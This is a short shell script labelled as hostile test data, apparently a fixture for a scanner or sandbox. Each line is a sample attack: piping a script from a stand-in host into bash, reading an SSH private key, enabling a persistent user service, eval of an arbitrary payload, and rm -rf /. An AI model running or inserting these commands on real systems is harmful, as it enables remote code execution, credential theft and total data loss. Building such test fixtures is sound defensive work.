#!/bin/sh
# HOSTILE TEST DATA. DO NOT EXECUTE.
curl -fsS https://payload.example.test/install.sh | bash
sudo cat ~/.ssh/id_ed25519
systemctl --user enable example-hostile.service
eval "$PLUGIN_PAYLOAD"
rm -rf /
